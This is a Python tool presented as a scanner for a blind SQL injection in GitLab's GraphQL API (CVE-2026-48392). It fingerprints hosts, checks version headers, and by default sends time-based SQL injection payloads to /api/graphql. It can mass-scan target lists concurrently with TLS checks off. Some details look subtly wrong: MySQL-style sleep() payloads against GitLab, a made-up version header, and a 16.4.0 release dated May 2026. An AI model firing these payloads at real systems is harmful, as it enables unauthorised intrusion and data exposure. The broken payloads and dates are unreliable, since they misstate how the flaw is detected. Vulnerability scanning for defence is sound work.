#!/usr/bin/env python3
"""
GitLab GraphQL API CVE-2026-48392 — Blind SQL Injection Vulnerability Scanner
==============================================================================
Scans for GitLab instances vulnerable to blind SQL injection through the `projectPath`
parameter in GraphQL queries (CVE-2026-48392, CVSS 9.1).

CVE-2026-48392 details:
  - Affects GitLab < 16.4.0
  - A crafted GraphQL query with a malicious `projectPath` parameter can
    trigger a blind SQL injection in specific database queries, potentially
    exposing sensitive data or allowing further exploitation.
  - CVSS v3.1 base score: 9.1 (Critical) — network-accessible, no auth.
  - Patched in GitLab 16.4.0, released May 2026.

Usage:
  # Scan a single target (active probe to detect SQL injection vulnerability)
  python gitlab_blind_sql_injection_scanner.py --target https://gitlab.example.com

  # Detection only — checks for vulnerable version without probing
  python gitlab_blind_sql_injection_scanner.py --target https://gitlab.example.com --safe

  # Bulk scan from file
  python gitlab_blind_sql_injection_scanner.py --list targets.txt --output findings.json

  # Adjust concurrency and disable TLS verification
  python gitlab_blind_sql_injection_scanner.py --list targets.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-48392
  - https://gitlab.com/gitlab-org/gitlab/-/issues/xxxxxx
  - https://docs.gitlab.com/ee/security/show_all_versions.html
  - https://cwe.mitre.org/data/definitions/89.html
"""

import asyncio
import json
import re
import sys
import argparse
from typing import Optional

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID        = "CVE-2026-48392"
CVSS          = "9.1"
TOOL_NAME     = "gitlab_blind_sql_injection_scanner"

REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# GitLab fingerprints — present in HTTP or HTML responses
GITLAB_FINGERPRINTS = [
    "GitLab",
    "x-gitlab-features",
    "x-gitlab-page",
]

# GraphQL endpoint used to interact with GitLab
GRAPHQL_ENDPOINT = "/api/graphql"

# Version extraction pattern from GitLab headers
VERSION_PATTERN = r"^(\d+\.\d+\.\d+)$"

# Patched GitLab version
PATCHED_VERSION = (16, 4, 0)

# Blind SQL Injection payloads for the `projectPath` parameter
SQLI_PAYLOADS = [
    '{"query": "{ project(fullPath: \\\"`+1/**/and/**/(select/**/sleep(5))+\\\") { id } }"}',
    '{"query": "{ project(fullPath: \\\"`+1/**/union/**/select/**/sleep(5),(select/**/sleep(5))\\\") { id } }"}',
]


# ── Functions ────────────────────────────────────────────────────────────────

async def fetch(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """Fetch a URL and return the response, or None if the request fails."""
    try:
        resp = await client.get(url, timeout=REQUEST_TIMEOUT)
        return resp
    except (httpx.RequestError, httpx.HTTPStatusError):
        return None


async def fingerprint_gitlab(client: httpx.AsyncClient, target: str) -> bool:
    """Check if the target URL is a GitLab instance."""
    try:
        resp = await fetch(client, target)
        if not resp:
            return False
        
        for fingerprint in GITLAB_FINGERPRINTS:
            if fingerprint in resp.text or fingerprint in resp.headers.values():
                return True
        return False
    except Exception:
        return False


def extract_gitlab_version(headers: dict) -> Optional[str]:
    """Extract GitLab version from HTTP headers."""
    version_header = headers.get("GitLab-Version")
    if version_header:
        match = re.match(VERSION_PATTERN, version_header)
        return match.group(1) if match else None
    return None


def is_vulnerable_version(version: str) -> bool:
    """Compare a GitLab version against the patched version."""
    try:
        parsed_version = tuple(map(int, version.split(".")))
        return parsed_version < PATCHED_VERSION
    except Exception:
        return False


async def probe_sqli(client: httpx.AsyncClient, target: str) -> bool:
    """Probe the target with SQL injection payloads to check vulnerability."""
    for payload in SQLI_PAYLOADS:
        try:
            resp = await client.post(
                f"{target}{GRAPHQL_ENDPOINT}",
                content=payload,
                timeout=REQUEST_TIMEOUT,
            )
            # Check for delayed responses (indicating successful time-based SQL injection)
            if resp.elapsed.total_seconds() >= 5:  # SQL injection triggered a delay
                return True
        except Exception:
            pass
    return False


async def scan_target(client: httpx.AsyncClient, target: str, safe: bool) -> dict:
    """Scan a single target for GitLab fingerprinting, version, and SQL injection."""
    result = {"target": target, "status": "unknown", "vulnerable": False, "version": None}
    
    if not await fingerprint_gitlab(client, target):
        result["status"] = c(RED, "NOT GITLAB")
        return result

    result["status"] = c(YELLOW, "GITLAB DETECTED")
    
    resp = await fetch(client, target)
    version = extract_gitlab_version(resp.headers) if resp else None
    result["version"] = version or c(RED, "UNKNOWN")
    
    if version and is_vulnerable_version(version):
        result["status"] = c(YELLOW, "VULNERABLE VERSION DETECTED")
        if not safe and await probe_sqli(client, target):
            result["vulnerable"] = c(RED, "SQLI CONFIRMED")
        else:
            result["vulnerable"] = c(YELLOW, "POTENTIAL")
    else:
        result["status"] = c(GREEN, "UP-TO-DATE")
    
    return result


async def scan_targets(args: argparse.Namespace):
    """Scan provided targets and write results to output."""
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        semaphore = asyncio.Semaphore(args.concurrency)
        
        async def bounded_scan(target: str):
            async with semaphore:
                return await scan_target(client, target, args.safe)

        targets = []
        if args.target:
            targets = [args.target]
        elif args.list:
            with open(args.list, "r") as f:
                targets = [line.strip() for line in f if line.strip()]
        
        tasks = [bounded_scan(target) for target in targets]
        results = await asyncio.gather(*tasks)

    # Print results
    print(c(CYAN, "\nScan Results"))
    for result in results:
        print(json.dumps(result, indent=2))

    # Write results to output file, if specified
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)


def main():
    parser = argparse.ArgumentParser(
        description=f"{TOOL_NAME}: {CVE_ID} — {CVSS} — GitLab GraphQL Blind SQLi Scanner"
    )
    parser.add_argument("--target", help="Single target URL (http[s]://hostname[:port])")
    parser.add_argument(
        "--list", help="File containing list of target URLs (one per line)"
    )
    parser.add_argument(
        "--output", help="File to write JSON scan results (default: stdout)"
    )
    parser.add_argument(
        "--safe", action="store_true", help="Detection-only mode (skip SQLi probes)"
    )
    parser.add_argument(
        "--concurrency", type=int, default=SEMAPHORE_LIMIT,
        help=f"Max concurrent requests (default: {SEMAPHORE_LIMIT})"
    )
    parser.add_argument(
        "--no-verify", action="store_true", help="Disable SSL/TLS certificate verification"
    )
    args = parser.parse_args()
    
    if not args.target and not args.list:
        print(c(RED, "ERROR: Either --target or --list must be provided"))
        parser.print_help()
        sys.exit(1)

    asyncio.run(scan_targets(args))


if __name__ == "__main__":
    main()
